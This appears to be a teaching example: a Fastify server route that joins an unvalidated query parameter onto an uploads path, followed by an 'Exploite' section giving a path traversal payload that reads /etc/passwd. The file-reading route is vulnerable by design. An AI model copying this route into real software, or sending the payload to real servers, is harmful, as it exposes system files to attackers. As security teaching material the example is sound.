```javascript
 const fs = require("fs");
    const path = require("path");
    const fastify = require("fastify")();

    const config = require('./config.json');

    fastify.get("/static", async (req, rep) => {

        const filename = req.query.filename;
        const filePath = path.join(
            "/opt/app/uploads", filename);

        try {
            const fileContents = fs.readFileSync(
                filePath);
            rep.code(200).send(fileContents);
        } catch (err) {
            rep.code(404).send("File not found");
        }
    });

    fastify.listen({ port: 3000 });
```


<details>
  <summary><b>Exploite</b></summary>

  ```text
filename=../../../../../../../etc/passwd
  ```
</details>
